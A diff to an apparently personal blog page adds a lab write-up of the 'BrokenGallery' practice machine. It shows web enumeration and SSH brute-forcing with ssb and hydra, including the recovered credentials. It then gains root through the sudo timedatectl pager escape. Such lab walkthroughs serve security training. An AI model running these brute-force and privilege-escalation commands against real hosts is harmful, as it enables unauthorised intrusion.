@@ -1211,7 +1211,113 @@ root
 <h3 id="brokengallery">BrokenGallery</h3>
 
 <ol>
-  <li>Enumeration: run port scan like <code class="highlighter-rouge">rustscan</code> and <code class="highlighter-rouge">nmap</code> found that ports 22 and 80 are the only opened services,</li>
+  <li>
+    <p>Enumeration: run port scan like <code class="highlighter-rouge">rustscan</code> and <code class="highlighter-rouge">nmap</code> found that ports 22 and 80 are the only opened services.  <code class="highlighter-rouge">nmap</code> found that ssh is on version 7.2p2 which vuln for user enumeration (this is from experiance, but you can also run <code class="highlighter-rouge">searchsploit</code> and find this details). Since it’s all we have we going to enumerate the web.</p>
+  </li>
+  <li>Web Enumeration: run webenum against the web found README.md file that contain, what look like, hexa values:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
+0x00, 0x01, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x1F, 0x43, 0x6F, 0x6D, 0x70, 0x72, 0x65, 0x73, 0x73,
+0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x6A, 0x70, 0x65, 0x67, 0x2D, 0x72, 0x65, 0x63, 0x6F, 0x6D,
+0x70, 0x72, 0x65, 0x73, 0x73, 0xFF, 0xDB, 0x00, 0x84, 0x00, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04,
+...
+</code></pre></div>    </div>
+    <p>So, we can download it using <code class="highlighter-rouge">wget</code> and then running bash tools for convert it out, and found this is some compress image file, type of jpeg file.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat README.md|sed 's/0x//g'|sed 's/, //g'|xxd -r -p
+����JFIF��Compressed by jpeg-recompress���
+</code></pre></div>    </div>
+    <p>Redirect the output to file with the following:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat README.md|sed 's/0x//g'|sed 's/, //g'|xxd -r -p &gt; image.jpeg
+</code></pre></div>    </div>
+    <p>Then open that file using some photos viewer, we can see the following note.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello Bob,
+The application is BROKEN ! the whole infrastructure is BROKEN !!!!
+I am leaving for my summer vacation, I hope you get i fix soon ...
+Cheers.
+avrahamcohen.ac@gmail.com
+</code></pre></div>    </div>
+    <p>Since we have nothing from that one, we enumerate more the web, but also since we know that ssh on version 7.2p2 are vulnerable for user enumeration we create file list from the users we found on the web for use them later on. So far we found bob and avrahamcohen, also ac can be username in that case, so we make list of users from what we found. Also we can run <code class="highlighter-rouge">cewl</code>.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ cewl http://192.168.166.24 -m 3 -w cewl_80.txt -v  
+</code></pre></div>    </div>
+    <p>That <code class="highlighter-rouge">cewl</code> create from the web wordlist that contain words with minimum 3 letters for a word.</p>
+  </li>
+  <li>SSH Enumeration: so now, we can run exploit specific for <strong>CVE-2016-6210</strong>, which is username enumeration for that ssh version (7.2p2), I have use <code class="highlighter-rouge">searchsploit</code> and also download several python exploit that I found on github, but none of them work, also part of them have some error about <code class="highlighter-rouge">time.clock()</code> which can be solve by update the code to use <code class="highlighter-rouge">time.process_time()</code> instead. But still the username can’t be found, so I use <code class="highlighter-rouge">ssb</code> with bash code to go against each user.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ for user in $(cat ./cewl_80.txt ); do ssb -w ./cewl_80.txt -p 22 $user@192.168.166.24;done&gt; ssb_out.txt
+</code></pre></div>    </div>
+    <p>With that one I have found that broken user are exist on the target.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Secure Shell Bruteforcer
+infosec@kitabisa.com
+________________________
+:: Username: broken
+:: Hostname: 192.168.166.24
+:: Port    : 22
+:: Wordlist: ./cewl_80.txt
+:: Threads : 100
+:: Timeout : 30s
+________________________
+[VLD] Connected with 'broken'.
+[INF] Done!
+</code></pre></div>    </div>
+    <p>From that <code class="highlighter-rouge">ssb</code> tool it’s look like broken user exist and also it’s password are broken, we can also run <code class="highlighter-rouge">hydra</code> against the target, it will take more time then the <code class="highlighter-rouge">ssb</code>, but in some cases it work better then <code class="highlighter-rouge">ssb</code>.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ hydra -L ./users.txt -P ./users.txt 192.168.166.24 ssh -I -t 16
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-18 09:19:20
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1024 login tries (l:32/p:32), ~64 tries per task
+[DATA] attacking ssh://192.168.166.24:22/
+[STATUS] 310.00 tries/min, 310 tries in 00:01h, 718 to do in 00:03h, 12 active
+[22][ssh] host: 192.168.166.24   login: broken   password: broken
+[STATUS] 298.00 tries/min, 596 tries in 00:02h, 432 to do in 00:02h, 12 active
+[STATUS] 283.67 tries/min, 851 tries in 00:03h, 177 to do in 00:01h, 12 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-18 09:23:02
+</code></pre></div>    </div>
+  </li>
+  <li>Initiation: so now we can just run ssh with broken user with password of “broken” also, then we login as regolare user to the target, so we just need to enumerate it for run privilege escalation, then we finish that target.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ssh broken@192.168.166.24 -p 22
+broken@192.168.166.24's password:
+Permission denied, please try again.
+broken@192.168.166.24's password:
+Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
+ * Documentation:  https://help.ubuntu.com/
+787 packages can be updated.
+491 updates are security updates.
+broken@ubuntu:~$
+</code></pre></div>    </div>
+  </li>
+  <li>System Enumeration: so we now on the final step before going to be root, or I just hope so. We enumerate the target with <code class="highlighter-rouge">linpeas</code> and we found several stuff, the first is the version of the linux, which are <code class="highlighter-rouge">ubuntu 4.4.0-21-generic</code>, so if we going on that path we need to run exploit suggester or just search on google appropriate exploit for that version. But also we can found that the broken user can run two binaries without password.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>broken@ubuntu:~$ sudo -l
+Matching Defaults entries for broken on ubuntu:
+ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User broken may run the following commands on ubuntu:
+ (ALL) NOPASSWD: /usr/bin/timedatectl
+ (ALL) NOPASSWD: /sbin/reboot
+broken@ubuntu:~$
+</code></pre></div>    </div>
+    <p>Searching <code class="highlighter-rouge">timedatectl</code> on <code class="highlighter-rouge">gtfobins</code> we can find that we can use it to gain access as root.</p>
+  </li>
+  <li>Privilege Escalation: so now we just need to run <code class="highlighter-rouge">timedatectl</code> with <code class="highlighter-rouge">sudo</code> with argument about listing the timezone, then we can run <code class="highlighter-rouge">/bin/sh</code> directly.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>broken@ubuntu:~$ sudo timedatectl list-timezones
+Africa/Abidjan
+Africa/Accra
+Africa/Addis_Ababa
+Africa/Algiers
+Africa/Asmara
+Africa/Bamako
+Africa/Bangui
+Africa/Banjul
+Africa/Bissau
+Africa/Blantyre
+Africa/Brazzaville
+Africa/Bujumbura
+Africa/Cairo
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+</code></pre></div>    </div>
+  </li>
 </ol>
 
 <h3 id="dawn2">Dawn2</h3>
